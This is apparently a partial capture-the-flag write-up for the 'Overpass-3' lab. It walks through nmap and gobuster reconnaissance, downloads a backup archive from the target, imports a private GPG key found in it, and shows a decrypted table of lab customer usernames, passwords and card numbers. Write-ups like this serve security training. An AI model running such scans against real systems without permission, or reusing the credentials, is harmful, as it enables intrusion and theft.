# Overpass-3

Web flag

nmap -sC -sV --.--.---.--- -p- -T4
* -sC .
    Performs a script scan using the default set of scripts. It is equivalent to --script=default. Some
    of the scripts in this category are considered intrusive and should not be run against a target
    network without permission.

* -sV (Version detection) .
    Enables version detection, as discussed above. Alternatively, you can use -A, which enables version
    detection among other things.

* -p- port ranges (Only scan specified ports) .
    This option specifies which ports you want to scan and overrides the default. Individual port numbers
    are OK, as are ranges separated by a hyphen (e.g.  1-1023). The beginning and/or end values of a
    range may be omitted, causing Nmap to use 1 and 65535, respectively. So you can specify -p- to scan
    ports from 1 through 65535. Scanning port zero.  is allowed if you specify it explicitly. For IP
    protocol scanning (-sO), this option specifies the protocol numbers you wish to scan for (0–255).        

```
nmap -sC -sV --.--.---.--- -p- -T4                                                                                                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-09 16:42 CDT
Nmap scan report for --.--.---.---
Host is up (0.13s latency).
Not shown: 65532 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 223.17 seconds
```

gobuster dir -u http://<ipaddress> -w /usr/share/wordslists/dirbuster/directory-list-2.3-medium.txt -x .php,.html,.zip

* -u string
        The target URL or Domain

* -x string
        File extension(s) to search for (dir mode only)

* -w string
        Path to the wordlist
```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://--.--.---.--- -x .php,.html,.zip                                1 ⚙
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://--.--.---.---
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,html,zip
[+] Timeout:                 10s
===============================================================
2021/04/09 16:50:43 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 1770]
/b-----s              (Status: 301) [Size: 237] [--> http://--.--.---.---/b-----s/]
```

```
wget http://--.--.---.---/b-----s/b----p.zip                                                                                                       
--2021-04-09 17:14:10--  http://--.--.---.---/b-----s/b----p.zip
Connecting to --.--.---.---:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 13353 (13K) [application/zip]
Saving to: ‘backup.zip.1’

backup.zip.1                            100%[=============================================================================>]  13.04K  --.-KB/s    in 0.1s    

2021-04-09 17:14:10 (105 KB/s) - ‘backup.zip.1’ saved [13353/13353]
```

```
gpg --list-keys
/home/reggie/.gnupg/pubring.kbx
-------------------------------
pub   rsa2048 2020-11-08 [SC] [expires: 2022-11-08]
      49829BBEB100BB2692F33CD2C9AE71AB3180BC08
uid           [ unknown] Paradox <paradox@overpass.thm>
sub   rsa2048 2020-11-08 [E] [expires: 2022-11-08]


┌──(reggie㉿kali)-[~/Downloads]
└─$ gpg --import priv.key
gpg: key C9AE71AB3180BC08: "Paradox <paradox@overpass.thm>" not changed
gpg: key C9AE71AB3180BC08: secret key imported
gpg: Total number processed: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:  secret keys unchanged: 1
```

|Customer Name|	Username|	Password|	Credit card number|	CVC|
____________________________________________________________
|Par. A. Doxx	|paradox	|ShibesAreGreat123|	4111 1111 4555 1142|	432|
____________________________________________________________
0day Montgomery	0day	OllieIsTheBestDog	5555 3412 4444 1115	642
Muir Land	muirlandoracle	A11D0gsAreAw3s0me	5103 2219 1119 9245	737
